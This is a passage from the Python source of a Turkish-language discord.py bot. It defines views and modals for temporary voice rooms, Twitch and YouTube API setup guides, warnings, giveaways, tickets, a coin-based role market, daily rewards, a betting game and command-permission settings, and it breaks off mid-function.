                await interaction.response.send_message("❌ Limit 0-99 arasında olmalı!", ephemeral=True)
                return
            
            channel = interaction.guild.get_channel(self.room_data["channel_id"])
            if channel:
                await channel.edit(user_limit=limit)
                self.room_data["user_limit"] = limit
                bot.temp_rooms[str(channel.id)] = self.room_data
                bot.save_json(bot.temp_rooms, "temp_rooms.json")
                await interaction.response.send_message(f"✅ Kullanıcı limiti {limit} olarak ayarlandı!", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("❌ Lütfen geçerli bir sayı girin!", ephemeral=True)

class AddUserModal(discord.ui.Modal, title="Kullanıcı Ekle"):
    def __init__(self, room_data):
        super().__init__()
        self.room_data = room_data
        self.user_id = discord.ui.TextInput(
            label="Kullanıcı ID",
            placeholder="Kullanıcı ID girin",
            required=True
        )
        self.add_item(self.user_id)
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            user_id = int(self.user_id.value)
            user = interaction.guild.get_member(user_id)
            if not user:
                await interaction.response.send_message("❌ Kullanıcı bulunamadı!", ephemeral=True)
                return
            
            channel = interaction.guild.get_channel(self.room_data["channel_id"])
            if channel:
                await channel.set_permissions(user, connect=True, view_channel=True)
                
                if "allowed_users" not in self.room_data:
                    self.room_data["allowed_users"] = []
                if user_id not in self.room_data["allowed_users"]:
                    self.room_data["allowed_users"].append(user_id)
                
                bot.temp_rooms[str(channel.id)] = self.room_data
                bot.save_json(bot.temp_rooms, "temp_rooms.json")
                await interaction.response.send_message(f"✅ {user.mention} odaya eklendi!", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("❌ Lütfen geçerli bir kullanıcı ID girin!", ephemeral=True)

class RemoveUserModal(discord.ui.Modal, title="Kullanıcıyı Çıkar"):
    def __init__(self, room_data):
        super().__init__()
        self.room_data = room_data
        self.user_id = discord.ui.TextInput(
            label="Kullanıcı ID",
            placeholder="Kullanıcı ID girin",
            required=True
        )
        self.add_item(self.user_id)
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            user_id = int(self.user_id.value)
            user = interaction.guild.get_member(user_id)
            if not user:
                await interaction.response.send_message("❌ Kullanıcı bulunamadı!", ephemeral=True)
                return
            
            channel = interaction.guild.get_channel(self.room_data["channel_id"])
            if channel:
                await channel.set_permissions(user, overwrite=None)
                
                if "allowed_users" in self.room_data and user_id in self.room_data["allowed_users"]:
                    self.room_data["allowed_users"].remove(user_id)
                
                bot.temp_rooms[str(channel.id)] = self.room_data
                bot.save_json(bot.temp_rooms, "temp_rooms.json")
                await interaction.response.send_message(f"✅ {user.mention} odadan çıkarıldı!", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("❌ Lütfen geçerli bir kullanıcı ID girin!", ephemeral=True)

# Get Twitch API View
class GetTwitchAPIView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    
    @discord.ui.button(label="English", style=discord.ButtonStyle.primary, emoji="🇺🇸")
    async def english_guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        guide = """**Steps to Obtain Twitch API Credentials**

1. **Go to Twitch Developer Console**
   Visit https://dev.twitch.tv/console and log in with your Twitch account.

2. **Register Your Application**
   • Click "Register Your Application"
   • Fill in the following:
     - Name: Your bot name (e.g., DiscordBot)
     - OAuth Redirect URLs: http://localhost:3000 (or your bot's URL)
     - Category: "Chat Bot"
   • Click "Create"

3. **Get Your Credentials**
   • After creation, you'll see "Client ID" and "Client Secret"
   • Click "New Secret" to generate a Client Secret
   • Copy both Client ID and Client Secret

4. **Manage Your Application**
   • You can edit details anytime
   • Keep credentials secure!

**Important:** Client Secret should not be shared publicly!"""
        
        await interaction.response.send_message(guide, ephemeral=True)
    
    @discord.ui.button(label="Türkçe", style=discord.ButtonStyle.primary, emoji="🇹🇷")
    async def turkish_guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        guide = """**Twitch API Kimlik Bilgileri Alma Adımları**

1. **Twitch Developer Console'a Gidin**
   https://dev.twitch.tv/console adresini ziyaret edin ve Twitch hesabınızla giriş yapın.

2. **Uygulamanızı Kaydedin**
   • "Uygulamanızı Kaydedin" butonuna tıklayın
   • Aşağıdakileri doldurun:
     - İsim: Bot adınız (örn., DiscordBot)
     - OAuth Yönlendirme URL'leri: http://localhost:3000 (veya bot URL'niz)
     - Kategori: "Sohbet Botu"
   • "Oluştur" butonuna tıklayın

3. **Kimlik Bilgilerinizi Alın**
   • Oluşturduktan sonra "Client ID" ve "Client Secret" göreceksiniz
   • Client Secret oluşturmak için "New Secret" butonuna tıklayın
   • Hem Client ID hem de Client Secret'ı kopyalayın

4. **Uygulamanızı Yönetin**
   • Detayları istediğiniz zaman düzenleyebilirsiniz
   • Kimlik bilgilerinizi güvende tutun!

**Önemli:** Client Secret asla paylaşılmamalıdır!"""
        
        await interaction.response.send_message(guide, ephemeral=True)

# Mevcut diğer View'lar...
class TagCloseView(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
        
        self.select = discord.ui.Select(
            placeholder="Etiket engellenecek roller/üyeleri seçin",
            min_values=1,
            max_values=25,
            options=[]
        )
        self.select.callback = self.select_callback
        self.add_item(self.select)
        
        self.fill_options()
    
    def fill_options(self):
        guild = bot.get_guild(int(self.guild_id))
        if not guild:
            return
            
        options = []
        
        for role in guild.roles[-15:]:
            if role.name != "@everyone" and not role.managed:
                options.append(discord.SelectOption(
                    label=f"👑 {role.name}",
                    value=f"role_{role.id}",
                    description=f"Rol - {role.id}"
                ))
        
        members_added = 0
        for member in guild.members:
            if members_added >= 10:
                break
            if not member.bot:
                options.append(discord.SelectOption(
                    label=f"👤 {member.display_name}",
                    value=f"user_{member.id}",
                    description=f"Kullanıcı - {member.id}"
                ))
                members_added += 1
        
        self.select.options = options
    
    async def select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        selected_values = self.select.values
        
        if self.guild_id not in bot.tag_close_data:
            bot.tag_close_data[self.guild_id] = []
        
        added = []
        for value in selected_values:
            if value not in bot.tag_close_data[self.guild_id]:
                bot.tag_close_data[self.guild_id].append(value)
                added.append(value)
        
        bot.save_json(bot.tag_close_data, "tag_close.json")
        
        if added:
            targets = []
            for target in added:
                type_, id_ = target.split('_')
                if type_ == "role":
                    role = interaction.guild.get_role(int(id_))
                    if role:
                        targets.append(role.mention)
                else:
                    user = interaction.guild.get_member(int(id_))
                    if user:
                        targets.append(user.mention)
            
            await interaction.response.send_message(
                get_text(self.guild_id, "tag_close_added", target=", ".join(targets)),
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "❌ Seçilen hedefler zaten engelleme listesinde!",
                ephemeral=True
            )

class WarnListView(discord.ui.View):
    def __init__(self, user_id, warnings):
        super().__init__(timeout=60)
        self.user_id = user_id
        self.warnings = warnings
        self.current_page = 0
        self.page_size = 5
    
    def create_embed(self, guild_id):
        start_idx = self.current_page * self.page_size
        end_idx = start_idx + self.page_size
        page_warnings = list(self.warnings.items())[start_idx:end_idx]
        
        total_pages = math.ceil(len(self.warnings) / self.page_size)
        
        embed = discord.Embed(
            title=get_text(guild_id, "warn_list", user=f"<@{self.user_id}>"),
            color=get_rainbow_color()
        )
        
        if not page_warnings:
            embed.description = get_text(guild_id, "warn_none")
        else:
            for i, (warn_id, warn_data) in enumerate(page_warnings, start_idx + 1):
                moderator = f"<@{warn_data['moderator_id']}>"
                timestamp = int(datetime.datetime.fromisoformat(warn_data['timestamp']).timestamp())
                embed.add_field(
                    name=f"#{i}",
                    value=get_text(guild_id, "warn_entry", 
                                 count=i, 
                                 reason=warn_data['reason'], 
                                 moderator=moderator, 
                                 timestamp=timestamp),
                    inline=False
                )
        
        embed.set_footer(text=f"Sayfa {self.current_page + 1}/{total_pages}")
        return embed
    
    @discord.ui.button(label="◀️", style=discord.ButtonStyle.secondary)
    async def previous_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        if self.current_page > 0:
            self.current_page -= 1
            embed = self.create_embed(str(interaction.guild.id))
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()
    
    @discord.ui.button(label="▶️", style=discord.ButtonStyle.secondary)
    async def next_page(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        total_pages = math.ceil(len(self.warnings) / self.page_size)
        if self.current_page < total_pages - 1:
            self.current_page += 1
            embed = self.create_embed(str(interaction.guild.id))
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

class GetYouTubeAPIView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=60)
    
    @discord.ui.button(label="English", style=discord.ButtonStyle.primary, emoji="🇺🇸")
    async def english_guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        guide = """**Steps to Obtain a YouTube API Key**

1. **Go to Google Cloud Platform**
   https://console.cloud.google.com/ - Sign in with Google

2. **Create a New Project**
   • Click "Select Project" → "New Project"
   • Name it (e.g., "DiscordYTBot")
   • Click "Create"

3. **Enable YouTube Data API v3**
   • Search "YouTube Data API v3"
   • Click "Enable"

4. **Create API Key**
   • Go to "APIs & Services" → "Credentials"
   • Click "+ Create Credentials" → "API key"
   • Copy your API key

5. **Restrict Key (Recommended)**
   • Click "Restrict Key"
   • Select "YouTube Data API v3"
   • Add IP restrictions if needed"""
        
        await interaction.response.send_message(guide, ephemeral=True)
    
    @discord.ui.button(label="Türkçe", style=discord.ButtonStyle.primary, emoji="🇹🇷")
    async def turkish_guide(self, interaction: discord.Interaction, button: discord.ui.Button):
        guide = """**YouTube API Anahtarı Alma Adımları**

1. **Google Cloud Platform'a Gidin**
   https://console.cloud.google.com/ - Google ile giriş yapın

2. **Yeni Proje Oluşturun**
   • "Proje Seç" → "Yeni Proje"
   • İsim verin (örn., "DiscordYTBot")
   • "Oluştur" butonuna tıklayın

3. **YouTube Data API v3'ü Etkinleştirin**
   • "YouTube Data API v3" arayın
   • "Etkinleştir" butonuna tıklayın

4. **API Anahtarı Oluşturun**
   • "APIs & Services" → "Kimlik Bilgileri"
   • "+ Kimlik Bilgileri Oluştur" → "API anahtarı"
   • API anahtarınızı kopyalayın

5. **Anahtarı Sınırlandırın (Önerilir)**
   • "Anahtarı Sınırla" butonuna tıklayın
   • "YouTube Data API v3" seçin
   • Gerekirse IP kısıtlamaları ekleyin"""
        
        await interaction.response.send_message(guide, ephemeral=True)

class GiveawayJoinLimitView(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
        
        self.role_select = discord.ui.Select(
            placeholder="Katılma limiti için roller seçin",
            min_values=1,
            max_values=25,
            options=[]
        )
        self.role_select.callback = self.role_select_callback
        self.add_item(self.role_select)
        
        self.fill_options()
    
    def fill_options(self):
        guild = bot.get_guild(int(self.guild_id))
        if not guild:
            return
            
        options = []
        for role in guild.roles:
            if role.name != "@everyone" and not role.managed:
                options.append(discord.SelectOption(
                    label=role.name,
                    value=str(role.id),
                    description=f"ID: {role.id}"
                ))
        
        self.role_select.options = options[:25]
    
    async def role_select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        self.selected_roles = [int(role_id) for role_id in self.role_select.values]
        
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(view=self)
        
        self.role_limits = {}
        for role_id in self.selected_roles:
            role = interaction.guild.get_role(role_id)
            if role:
                await interaction.followup.send(
                    f"{role.mention} için katılma limitini girin (0 = sınırsız, sayı = limit):",
                    ephemeral=True
                )
                
                def check(m):
                    return m.author == interaction.user and m.channel == interaction.channel and (m.content.isdigit() or m.content == "0")
                
                try:
                    msg = await bot.wait_for('message', check=check, timeout=30)
                    limit = int(msg.content)
                    self.role_limits[role_id] = limit
                    
                    try:
                        await msg.delete()
                    except:
                        pass
                        
                except asyncio.TimeoutError:
                    await interaction.followup.send("Zaman aşımı!", ephemeral=True)
                    return
        
        if self.guild_id not in bot.giveaway_join_limits:
            bot.giveaway_join_limits[self.guild_id] = {}
        
        for role_id, limit in self.role_limits.items():
            bot.giveaway_join_limits[self.guild_id][str(role_id)] = limit
        
        bot.save_json(bot.giveaway_join_limits, "giveaway_join_limits.json")
        
        await interaction.followup.send("✅ Çekiliş katılma limitleri başarıyla ayarlandı!", ephemeral=True)

class TicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label='Kapat', style=discord.ButtonStyle.danger, custom_id='close_ticket')
    async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        if not has_command_permission('ticket-close')(interaction):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "no_permission"), ephemeral=True)
            return
        
        await interaction.response.send_message("Ticket 5 saniye içinde kapatılıyor...")
        await asyncio.sleep(5)
        await interaction.channel.delete()

class MarketView(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
    
    @discord.ui.select(
        placeholder="Satın almak için ürün seçin",
        options=[
            discord.SelectOption(label="Özel Rol (3 Gün)", value="special_role_3d", description="3 günlük özel rol"),
            discord.SelectOption(label="Özel Rol (7 Gün)", value="special_role_7d", description="7 günlük özel rol"),
            discord.SelectOption(label="VIP (30 Gün)", value="vip_30d", description="30 günlük VIP rolü"),
            discord.SelectOption(label="MegaVIP (30 Gün)", value="megavip_30d", description="30 günlük MegaVIP rolü"),
            discord.SelectOption(label="UltraVIP (30 Gün)", value="ultravip_30d", description="30 günlük UltraVIP rolü"),
            discord.SelectOption(label="SüperVIP (30 Gün)", value="supervip_30d", description="30 günlük SüperVIP rolü"),
            discord.SelectOption(label="SüperVIP+ (30 Gün)", value="supervip_plus_30d", description="30 günlük SüperVIP+ rolü"),
            discord.SelectOption(label="Sampy Premium (30 Gün)", value="sampy_premium_30d", description="30 günlük Sampy Premium rolü"),
        ]
    )
    async def select_product(self, interaction: discord.Interaction, select: discord.ui.Select):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        product = select.values[0]
        
        if str(interaction.guild_id) not in self.bot.market_data:
            await interaction.response.send_message(get_text(str(interaction.guild.id), "market_not_configured"), ephemeral=True)
            return
        
        price = self.bot.market_data[str(interaction.guild_id)][product]
        user_coins = self.bot.coins_data.get(str(interaction.user.id), 0)
        
        if user_coins < price:
            await interaction.response.send_message(
                get_text(str(interaction.guild.id), "not_enough_coins", need=price, have=user_coins), 
                ephemeral=True
            )
            return
        
        self.bot.coins_data[str(interaction.user.id)] = user_coins - price
        self.bot.save_json(self.bot.coins_data, self.bot.coins_file)
        
        owner_id = str(interaction.guild.owner_id)
        owner_coins = self.bot.coins_data.get(owner_id, 0)
        self.bot.coins_data[owner_id] = owner_coins + price
        self.bot.save_json(self.bot.coins_data, self.bot.coins_file)
        
        role_name = get_text(str(interaction.guild.id), product.split('_')[0])
        if "_" in product:
            duration = product.split('_')[1]
            role_name = f"{role_name} ({duration})"
        
        role = discord.utils.get(interaction.guild.roles, name=role_name)
        
        if role is None:
            role = await interaction.guild.create_role(
                name=role_name,
                color=discord.Color.random(),
                reason=f"{interaction.user} tarafından satın alındı"
            )
        
        await interaction.user.add_roles(role)
        
        purchase_id = f"{interaction.user.id}_{product}_{int(datetime.datetime.now().timestamp())}"
        expiry_time = datetime.datetime.now() + datetime.timedelta(days=int(''.join(filter(str.isdigit, product.split('_')[1]))))
        
        self.bot.purchases_data[purchase_id] = {
            "user_id": interaction.user.id,
            "guild_id": interaction.guild.id,
            "product": product,
            "role_id": role.id,
            "purchased_at": datetime.datetime.now().isoformat(),
            "expires_at": expiry_time.isoformat()
        }
        self.bot.save_json(self.bot.purchases_data, "purchases.json")
        
        await interaction.response.send_message(
            f"🎉 **{get_text(str(interaction.guild.id), 'purchased')}**\n"
            f"**Ürün:** {role_name}\n"
            f"**Fiyat:** {price} Sampy Coin\n"
            f"**Kalan Bakiye:** {self.bot.coins_data[str(interaction.user.id)]} Sampy Coin\n"
            f"**Rolünüz:** {role.mention}\n"
            f"**Bitiş:** <t:{int(expiry_time.timestamp())}:R>",
            ephemeral=True
        )

class AdvancedDailyView(discord.ui.View):
    def __init__(self, bot, user_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.user_id = user_id
        
    @discord.ui.button(label="🎁 Günlük Ödül Al (750 Coin)", style=discord.ButtonStyle.success)
    async def claim_daily(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        last_claim_key = f"{user_id}_last_daily"
        last_claim = self.bot.coins_data.get(last_claim_key)
        
        cooldown_hours = 12
        amount = 750

        if last_claim:
            last_claim_time = datetime.datetime.fromisoformat(last_claim)
            time_diff = datetime.datetime.now() - last_claim_time
            hours_diff = time_diff.total_seconds() / 3600

            if hours_diff < cooldown_hours:
                remaining_hours = cooldown_hours - hours_diff
                await interaction.response.send_message(
                    f"⏰ Günlük ödülünüzü **{remaining_hours:.1f} saat** sonra alabilirsiniz!",
                    ephemeral=True
                )
                return

        yt_bonus = 0
        guild_id = str(interaction.guild.id)
        
        yt_subscriber_role_name = get_text(guild_id, "yt_subscriber_role")
        yt_subscriber_role = discord.utils.get(interaction.guild.roles, name=yt_subscriber_role_name)
        if yt_subscriber_role and yt_subscriber_role in interaction.user.roles:
            yt_bonus += 1250
        
        yt_member_roles = [role for role in interaction.user.roles if role.name.startswith("YT-Member")]
        if yt_member_roles:
            yt_bonus += 1500
        
        total_amount = amount + yt_bonus

        self.bot.coins_data[user_id] = self.bot.coins_data.get(user_id, 0) + total_amount
        self.bot.coins_data[last_claim_key] = datetime.datetime.now().isoformat()
        self.bot.save_json(self.bot.coins_data, self.bot.coins_file)

        embed = discord.Embed(
            title="🎁 Günlük Ödül Alındı!",
            description=f"**+{total_amount} Sampy Coin** bakiyenize eklendi!",
            color=get_rainbow_color(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="Temel Ödül", value=f"{amount} Sampy Coin", inline=True)
        if yt_bonus > 0:
            embed.add_field(name="YouTube Bonusu", value=f"{yt_bonus} Sampy Coin", inline=True)
        embed.add_field(name="Yeni Bakiye", value=f"{self.bot.coins_data[user_id]} Sampy Coin 🪙", inline=True)
        embed.add_field(name="Sonraki Ödül", value=f"{cooldown_hours} saat", inline=True)
        embed.set_footer(text="Sampy Bot'u kullandığınız için teşekkürler!")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)

class RoleButtonView(discord.ui.View):
    def __init__(self, role_id):
        super().__init__(timeout=None)
        self.role_id = role_id
    
    @discord.ui.button(label="Rol Al/Kaldır", style=discord.ButtonStyle.primary, custom_id="role_button")
    async def role_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        role = interaction.guild.get_role(self.role_id)
        
        if not role:
            await interaction.response.send_message("❌ Rol bulunamadı!", ephemeral=True)
            return
        
        try:
            if role in interaction.user.roles:
                await interaction.user.remove_roles(role)
                await interaction.response.send_message(
                    f"✅ **{role.name}** rolü sizden kaldırıldı!", 
                    ephemeral=True
                )
            else:
                await interaction.user.add_roles(role)
                await interaction.response.send_message(
                    f"✅ **{role.name}** rolü size verildi!", 
                    ephemeral=True
                )
        except discord.Forbidden:
            await interaction.response.send_message("❌ Rolleri yönetme iznim yok!", ephemeral=True)

class NumberGameView(discord.ui.View):
    def __init__(self, bot, game_id, creator, target, bet_amount, number):
        super().__init__(timeout=300)
        self.bot = bot
        self.game_id = game_id
        self.creator = creator
        self.target = target
        self.bet_amount = bet_amount
        self.number = number
    
    @discord.ui.button(label="Kabul Et", style=discord.ButtonStyle.success, emoji="✅")
    async def accept_game(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        if interaction.user.id != self.target.id:
            await interaction.response.send_message("❌ Bu oyun sizin için değil!", ephemeral=True)
            return
        
        target_coins = self.bot.coins_data.get(str(self.target.id), 0)
        if target_coins < self.bet_amount:
            await interaction.response.send_message("❌ Yeterli Sampy Coin yok!", ephemeral=True)
            return
        
        self.bot.coins_data[str(self.target.id)] = target_coins - self.bet_amount
        self.bot.save_json(self.bot.coins_data, self.bot.coins_file)
        
        embed = discord.Embed(
            title="🎯 Sayı Tahmin Oyunu - Tahmin Zamanı!",
            description=f"{self.target.mention}, 1-10 arası bir sayı tahmin et!",
            color=get_rainbow_color()
        )
        embed.add_field(name="Bahis", value=f"{self.bet_amount} Sampy Coin", inline=True)
        embed.add_field(name="Ödül", value=f"{int(self.bet_amount * 1.8)} Sampy Coin", inline=True)
        
        await interaction.response.send_message(embed=embed)
        
        self.bot.number_games[self.game_id] = {
            "creator": self.creator.id,
            "target": self.target.id,
            "bet_amount": self.bet_amount,
            "number": self.number,
            "status": "waiting_guess"
        }
        self.bot.save_json(self.bot.number_games, "number_games.json")
        
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)
    
    @discord.ui.button(label="Reddet", style=discord.ButtonStyle.danger, emoji="❌")
    async def reject_game(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        if interaction.user.id != self.target.id:
            await interaction.response.send_message("❌ Bu oyun sizin için değil!", ephemeral=True)
            return
        
        await interaction.response.send_message("❌ Oyun reddedildi!")
        
        if self.game_id in self.bot.number_games:
            del self.bot.number_games[self.game_id]
            self.bot.save_json(self.bot.number_games, "number_games.json")
        
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(view=self)

class CommandPermissionView1(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
    
    @discord.ui.select(
        placeholder="Komut seçin (Bölüm 1)",
        options=[
            discord.SelectOption(label="At", value="kick"),
            discord.SelectOption(label="Yasakla", value="ban"),
            discord.SelectOption(label="Sustur", value="mute"),
            discord.SelectOption(label="Susturmayı Kaldır", value="unmute"),
            discord.SelectOption(label="Timeout", value="timeout"),
            discord.SelectOption(label="Timeout'u Kaldır", value="untimeout"),
            discord.SelectOption(label="Temizle", value="clear"),
            discord.SelectOption(label="Kanalı Sustur", value="mutechannel"),
            discord.SelectOption(label="Kanal Susturmasını Kaldır", value="unmutechannel"),
            discord.SelectOption(label="Ticket Kapat", value="ticket-close"),
            discord.SelectOption(label="Çekiliş", value="giveaway"),
            discord.SelectOption(label="Yazdır", value="write-for"),
            discord.SelectOption(label="IP Ban", value="ipban"),
            discord.SelectOption(label="IP Sustur", value="ipmute"),
            discord.SelectOption(label="IP Ban Kaldır", value="unipban"),
            discord.SelectOption(label="IP Susturma Kaldır", value="unipmute"),
            discord.SelectOption(label="Sayı Tahmin Oyunu", value="number-guessing-game"),
            discord.SelectOption(label="Sampy Coin Al", value="sampy-coin-take"),
            discord.SelectOption(label="Market Kurulum", value="market-setup"),
            discord.SelectOption(label="Market Satın Al", value="market-buy"),
            discord.SelectOption(label="Ticket Aç", value="ticket-open"),
            discord.SelectOption(label="Kod Oluştur", value="redeem-code-create"),
            discord.SelectOption(label="Kod Listesi", value="redeem-code-list"),
            discord.SelectOption(label="Kod Kullan", value="redeem-code"),
            discord.SelectOption(label="Yazı Tura", value="cf"),
        ]
    )
    async def select_command(self, interaction: discord.Interaction, select: discord.ui.Select):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        command_name = select.values[0]
        self.command_name = command_name
        
        roles = [role for role in interaction.guild.roles if role.name != "@everyone"]
        
        if not roles:
            await interaction.response.send_message("❌ Sunucuda rol bulunamadı!", ephemeral=True)
            return
        
        role_options = []
        for role in roles[:25]:
            role_options.append(discord.SelectOption(
                label=role.name,
                value=str(role.id),
                description=f"ID: {role.id}"
            ))
        
        embed = discord.Embed(
            title=f"🛠️ Komut İzin Ayarları - {command_name}",
            description="Bu komutu kullanabilecek rolleri seçin:",
            color=get_rainbow_color()
        )
        
        current_permissions = self.bot.command_permissions.get(self.guild_id, {}).get(command_name, [])
        if current_permissions:
            role_mentions = []
            for role_id in current_permissions:
                role = interaction.guild.get_role(role_id)
                if role:
                    role_mentions.append(role.mention)
            
            embed.add_field(
                name="Mevcut İzinler",
                value=", ".join(role_mentions) if role_mentions else "Sadece sunucu sahibi",
                inline=False
            )
        else:
            embed.add_field(
                name="Mevcut İzinler", 
                value="Sadece sunucu sahibi", 
                inline=False
            )
        
        view = RoleSelectionView(self.bot, self.guild_id, command_name, role_options)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

class CommandPermissionView2(discord.ui.View):
    def __init__(self, bot, guild_id):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
    
    @discord.ui.select(
        placeholder="Komut seçin (Bölüm 2)",
        options=[
            discord.SelectOption(label="Sunucu Bilgisi", value="server"),
            discord.SelectOption(label="Ping", value="ping"),
            discord.SelectOption(label="Yardım", value="help"),
            discord.SelectOption(label="Seviye", value="level"),
            discord.SelectOption(label="Seviye Sıralaması", value="leveltop"),
            discord.SelectOption(label="Günlük", value="daily"),
            discord.SelectOption(label="Sampy Coin", value="sampy-coin"),
            discord.SelectOption(label="Sampy Coin Transfer", value="sampy-coin-transfer"),
            discord.SelectOption(label="Market", value="market"),
            discord.SelectOption(label="Buton Rol Sistemi Kurulum", value="button-role-system-setup"),
            discord.SelectOption(label="Komut İzin Kurulum 1", value="command-permission-setup-1"),
            discord.SelectOption(label="Komut İzin Kurulum 2", value="command-permission-setup-2"),
            discord.SelectOption(label="Admin Paneli", value="admin-panel"),
            discord.SelectOption(label="Giriş Çıkış Kanalı Ayarla", value="input-output-channel-set"),
            discord.SelectOption(label="Dil Ayarla", value="setlang"),
            discord.SelectOption(label="Silinen Mesajlar Listesi", value="deleted-messages-list"),
            discord.SelectOption(label="Yetkili Başvuru Kurulum", value="authorized-application-setup"),
            discord.SelectOption(label="Kanalları Sıfırla", value="reset-channels-message"),
            discord.SelectOption(label="Geçmiş", value="history"),
            discord.SelectOption(label="Ban Kontrol", value="checkban"),
            discord.SelectOption(label="Susturma Kontrol", value="checkmute"),
            discord.SelectOption(label="Cezalı Kullanıcılar", value="punishment-users"),
            discord.SelectOption(label="Çekiliş Oluştur", value="giveaway-create"),
            discord.SelectOption(label="Çekiliş Bitir", value="giveaway-end"),
            discord.SelectOption(label="Çekiliş Tekrar Çek", value="giveaway-reroll"),
        ]
    )
    async def select_command(self, interaction: discord.Interaction, select: discord.ui.Select):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        command_name = select.values[0]
        self.command_name = command_name
        
        roles = [role for role in interaction.guild.roles if role.name != "@everyone"]
        
        if not roles:
            await interaction.response.send_message("❌ Sunucuda rol bulunamadı!", ephemeral=True)
            return
        
        role_options = []
        for role in roles[:25]:
            role_options.append(discord.SelectOption(
                label=role.name,
                value=str(role.id),
                description=f"ID: {role.id}"
            ))
        
        embed = discord.Embed(
            title=f"🛠️ Komut İzin Ayarları - {command_name}",
            description="Bu komutu kullanabilecek rolleri seçin:",
            color=get_rainbow_color()
        )
        
        current_permissions = self.bot.command_permissions.get(self.guild_id, {}).get(command_name, [])
        if current_permissions:
            role_mentions = []
            for role_id in current_permissions:
                role = interaction.guild.get_role(role_id)
                if role:
                    role_mentions.append(role.mention)
            
            embed.add_field(
                name="Mevcut İzinler",
                value=", ".join(role_mentions) if role_mentions else "Sadece sunucu sahibi",
                inline=False
            )
        else:
            embed.add_field(
                name="Mevcut İzinler", 
                value="Sadece sunucu sahibi", 
                inline=False
            )
        
        view = RoleSelectionView(self.bot, self.guild_id, command_name, role_options)
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

class RoleSelectionView(discord.ui.View):
    def __init__(self, bot, guild_id, command_name, role_options):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
        self.command_name = command_name
        self.role_options = role_options
        
        self.role_select = discord.ui.Select(
            placeholder="Rolleri seçin (çoklu seçim)",
            options=role_options,
            min_values=0,
            max_values=len(role_options)
        )
        self.role_select.callback = self.role_select_callback
        self.add_item(self.role_select)
    
    async def role_select_callback(self, interaction: discord.Interaction):
        if not is_verified(interaction.user, interaction.guild):
            await interaction.response.send_message(get_text(str(interaction.guild.id), "verification_required"), ephemeral=True)
            return
        
        selected_role_ids = [int(role_id) for role_id in self.role_select.values]
        
        if self.guild_id not in self.bot.command_permissions:
            self.bot.command_permissions[self.guild_id] = {}
        
        self.bot.command_permissions[self.guild_id][self.command_name] = selected_role_ids
        self.bot.save_json(self.bot.command_permissions, "command_permissions.json")
        
        embed = discord.Embed(
            title="✅ Komut İzinleri Güncellendi!",
            description=f"**{self.command_name}** komut izinleri başarıyla güncellendi.",
            color=get_rainbow_color()
        )
        
        if selected_role_ids:
